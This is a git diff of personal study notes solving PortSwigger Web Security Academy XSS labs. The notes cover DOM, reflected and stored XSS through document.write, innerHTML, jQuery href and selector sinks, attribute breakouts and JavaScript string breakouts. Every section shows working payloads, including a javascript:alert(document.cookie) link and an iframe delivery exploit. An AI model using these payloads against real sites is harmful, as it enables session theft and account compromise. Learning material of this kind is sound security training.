@@ -1,35 +1,33 @@
-## dom
-### document.write
-```
-# view-source / inspect element
-# see that my search string ends up in <img> tag:
+### DOM XSS in `document.write` sink using source `location.search`
+```js
+// see that my search string ends up in <img> tag:
 
 <img src="/resources/images/tracker.gif?searchTerms=adsf" q7yoldkbi="">
 
-# adjust search string to inject xss via <img> tag
+// adjust search string to inject xss via <img> tag
 
 sadf"><script>alert(1)</script>
 ```
 
-### innerHTML
-```
-# view-source / inspect element
-# see that my search string ends up in <span> tag:
+### DOM XSS in `innerHTML` sink using source `location.search`
+```js
+// view-source / inspect element
+// see that my search string ends up in <span> tag:
 
 <span id="searchMessage">fake</span>
 
-# break out
-# key: force an error to trigger "onerror"
+// break out
+// key: force an error to trigger "onerror"
 
 <img src=1 onerror=alert(1)>
 <audio src/onerror=alert(2)>
 
-# other key notes: it's totally ok to inject javascript as-is into <span> tags
+// other key notes: it's totally ok to inject javascript as-is into <span> tags
 ```
 
-### jQuery href
-```
-# see that '/feedback?returnPath=/' returns HTTP response with "src" calling "jquery":
+### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
+```js
+// see that '/feedback?returnPath=/' returns HTTP response with "src" calling "jquery":
 
 <script src="/resources/js/jquery_1-8-2.js"></script>
 <div class="is-linkback">
@@ -41,30 +39,30 @@ sadf"><script>alert(1)</script>
 	});
 </script>
 
-# see that a <href> tag is being built, using the input passed to "returnPath"
-# try inject random chars to "returnPath":
+// see that a <href> tag is being built, using the input passed to "returnPath"
+// try inject random chars to "returnPath":
 
 /feedback?returnPath=asdf
 
-# see that the resulting "Back" link leads to:
+// see that the resulting "Back" link leads to:
 
 https://0af3007a032c23bcc10958b000a10065.web-security-academy.net/asdf
 
-# now inject 
+// now inject 
 
 /feedback?returnPath=javascript:alert(document.cookie) 
 
-# now the "Back" link simply reads:
+// now the "Back" link simply reads:
 
 javascript:alert(document.cookie)
 
-# note: this uses the `javascript:` protocol to run text as JavaScript instead of opening it as a normal link
-# sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
+// note: this uses the `javascript:` protocol to run text as JavaScript instead of opening it as a normal link
+// sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
 ```
 
-### jQuery `$()` selector
-```
-# vulnerable portion:
+### DOM XSS in jQuery selector sink `$()` using a hashchange event
+```js
+// vulnerable portion:
 
 <script src="/resources/js/jquery_1-8-2.js"></script>
 <script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
@@ -75,30 +73,76 @@ javascript:alert(document.cookie)
 	});
 </script>
 
-# exploit via iframe (deliver to victim):
+// exploit via iframe (deliver to victim):
 
 <iframe src="https://0a8200b703a078abc312925a0003009d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
-# test that "print()" does get called when this payload runs normally
-# now deliver the payload
+// test that "print()" does get called when this payload runs normally
+// now deliver the payload
 ```
 
-### angle brackets HTML-encoded [helpful but not direct sauce](https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/)
-```
-# normal "<h1>hola</h1>" injection becomes:
+### Reflected XSS into attribute with angle brackets HTML-encoded [helpful but not direct sauce](https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/)
+```js
+// normal "<h1>hola</h1>" injection becomes:
 
 &lt;h1&gt;hola&lt;/h1&gt;
 
-# try avoiding angular brackets altogether; study the environment closely
-# notice that "hola" lands in a HTML attribute for an <input> tag:
+// try avoiding angular brackets altogether; study the environment closely
+// notice that "hola" lands in a HTML attribute for an <input> tag:
 
 <input type=text placeholder='Search the blog...' name=search value="hola">
 
-# target that attribute; close it gracefully and inject an event
+// target that attribute; close it gracefully and inject an event
 
 /?search="onmouseover="alert('hola')
 
-# such that the <input> tag becomes:
+// such that the <input> tag becomes:
 
 <input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert('hola')">
 ```
+
+### Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+```js
+// see the sink:
+
+<a id="author" href="https://www.fake.com">fake</a>
+
+// adjust "website" payload:
+
+javascript:alert(1)
+
+// now the href sink becomes:
+
+<a id="author" href="javascript:alert('hola')">
+
+// end of the day, it's due to lack of input validation on "website" field
+```
+
+### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+```js
+// sink:
+
+<script>
+var searchTerms = 'asdf';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+
+// break out of "encodeURIComponent()":
+
+a'-alert('hola')-'
+
+// sink becomes:
+
+<script>
+var searchTerms = 'a'-alert('hola')-'';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+
+// turns out it's nothing to do with the "encodeURIComponent()" - we're targeting the "var searchTerms" instead
+```
+
+### DOM XSS in `document.write` sink using source `location.search` inside a select element
+```
+
+```
+
